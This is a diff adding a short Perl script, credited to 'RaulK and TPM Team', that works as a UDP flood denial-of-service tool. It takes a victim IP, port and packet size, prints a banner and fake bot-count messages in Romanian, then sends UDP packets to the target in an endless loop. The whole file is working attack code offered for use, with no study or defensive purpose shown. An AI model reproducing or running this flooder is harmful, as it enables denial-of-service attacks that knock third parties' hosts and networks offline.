@@ -1,0 +1,80 @@
+#!/usr/bin/perl
+#BY RaulK AND TPM TEAM !~
+use Socket;
+
+$ARGC=@ARGV;
+if ($ARGC !=3) {
+ printf "[1;34mComanda Este: [1;33mperl $0 [1;31m[ip] [port] [Boti][1m\n";
+ exit(1);
+}
+my ($ip,$port,$size);
+	$ip=$ARGV[0];
+	$port=$ARGV[1];
+	$size=$ARGV[2];
+socket(flood, PF_INET, SOCK_DGRAM, 17);
+	$iaddr=inet_aton("$ip") or die "\033[1;34Nu putem ataca [1;33mip-ul [1;31m$ip";
+printf "
+lllll  lllll llllllll
+l   l ll   ll   ll
+lllll ll   ll   ll
+l   l ll   ll   ll
+lllll  lllll    ll
+BY RaulK TpM TeaM
+$ ip Ip-ul Victimei =]]";
+printf "                  
+[1;34mBoot [1;33m[TPM][1;31m Bot   
+[1;34m[1;33m[TPM]Send [100] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [200] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [300] bot ! [1;31m$ip  
+[1;34m[1;33m[TPM]Send [400] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [500] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [600] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [700] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [800] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [900] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [1000] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [1100] bot ! [1;31m$ip  
+[1;34m[1;33m[TPM]Send [100] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [200] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [300] bot ! [1;31m$ip  
+[1;34m[1;33m[TPM]Send [400] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [500] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [600] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [700] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [800] ot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [900] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [1000] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [1100] bot ! [1;31m$ip  
+[1;34m[1;33m[TPM]Send [100] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [200] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [300] bot ! [1;31m$ip  
+[1;34m[1;33m[TPM]Send [400] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [500] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [600] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [700] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [800] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [900] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [1000] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [1100] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [100] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [200] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [300] bot ! [1;31m$ip  
+[1;34m[1;33m[TPM]Send [400] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [500] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [600] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [700] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [800] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [900] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [1000] bot ! [1;31m$ip
+[1;34m[1;33m[TPM]Send [1100] bot ! [1;31m$ip
+[1;34m[1;33m Down#################################Down [1;31m$ip
+[1;34mVrei sa opresti [1;33m[Boti?][1;31m Apasa De 3 Ori Ctrl C 
+
+";
+goto packets;
+packets:
+for (;;) {
+	$pport=$port ? $port : int(rand(65500))+0;
+	$psize=$size ? $size : int(rand(1500))+0;
+send(flood, pack("a$psize","tpm"), 0, pack_sockaddr_in($pport,$iaddr));
+}
